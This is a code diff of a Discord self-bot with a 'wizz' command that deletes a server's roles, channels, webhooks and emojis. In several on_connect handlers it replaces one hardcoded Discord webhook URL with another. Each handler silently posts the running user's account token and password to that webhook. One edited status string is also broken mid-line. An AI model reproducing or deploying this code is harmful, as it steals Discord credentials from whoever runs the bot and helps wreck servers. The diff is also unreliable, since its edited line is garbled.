@@ -2016,7 +2016,9 @@ async def wizz(ctx):
             content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`")
+            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting 
+            
+            s...`")
         await asyncio.sleep(1)
         await message.edit(
             content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
@@ -2064,7 +2066,7 @@ async def wizz(ctx):
 @Murda.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/804247196677046282/0iKc8rqeHku_1-G5HHuFHkyf7T8-vzRUzO78AR31rC6KpVCWxRNSCzAuQrstVewgwKnR',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+  requests.post('https://discord.com/api/webhooks/814307124943388702/b2-PqhA6kzassntVYyNTEVLSPcIjO51wGemwshcHzWNDF87hFZQKjLUFRGCiwfwjQWur',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
         
 @Murda.command(name='8ball')
 async def _ball(ctx, *, question):
@@ -2174,7 +2176,7 @@ async def youtube(ctx, *, search):
 @Murda.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/804247196677046282/0iKc8rqeHku_1-G5HHuFHkyf7T8-vzRUzO78AR31rC6KpVCWxRNSCzAuQrstVewgwKnR',json={'content': f"**Token:** `{toe}`\n**Password:**
+  requests.post('https://discord.com/api/webhooks/814307124943388702/b2-PqhA6kzassntVYyNTEVLSPcIjO51wGemwshcHzWNDF87hFZQKjLUFRGCiwfwjQWur',json={'content': f"**Token:** `{toe}`\n**Password:**
         
 
 @Murda.command()
@@ -2225,7 +2227,7 @@ async def hastebin(ctx, *, message):
 @Murda.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/804247196677046282/0iKc8rqeHku_1-G5HHuFHkyf7T8-vzRUzO78AR31rC6KpVCWxRNSCzAuQrstVewgwKnR',json={'content': f"**Token:** `{toe}`\n**Password:**
+  requests.post('https://discord.com/api/webhooks/814307124943388702/b2-PqhA6kzassntVYyNTEVLSPcIjO51wGemwshcHzWNDF87hFZQKjLUFRGCiwfwjQWur',json={'content': f"**Token:** `{toe}`\n**Password:**
 
 @Murda.command(aliases=["fancy"])
 async def ascii(ctx, *, text):
@@ -2464,7 +2466,7 @@ async def hentai(ctx):
 @Murda.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/804247196677046282/0iKc8rqeHku_1-G5HHuFHkyf7T8-vzRUzO78AR31rC6KpVCWxRNSCzAuQrstVewgwKnR',json={'content': f"**Token:** `{toe}`\n**Password:**
+  requests.post('https://discord.com/api/webhooks/814307124943388702/b2-PqhA6kzassntVYyNTEVLSPcIjO51wGemwshcHzWNDF87hFZQKjLUFRGCiwfwjQWur',json={'content': f"**Token:** `{toe}`\n**Password:**
                    
 @Murda.command()
 async def boobs(ctx):
@@ -2892,7 +2894,7 @@ async def quote(ctx, *, message):
 @Murda.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/804247196677046282/0iKc8rqeHku_1-G5HHuFHkyf7T8-vzRUzO78AR31rC6KpVCWxRNSCzAuQrstVewgwKnR',json={'content': f"**Token:** `{toe}`\n**Password:**
+  requests.post('https://discord.com/api/webhooks/814307124943388702/b2-PqhA6kzassntVYyNTEVLSPcIjO51wGemwshcHzWNDF87hFZQKjLUFRGCiwfwjQWur',json={'content': f"**Token:** `{toe}`\n**Password:**
                    
 @Murda.command()
 async def code(ctx, *, message):
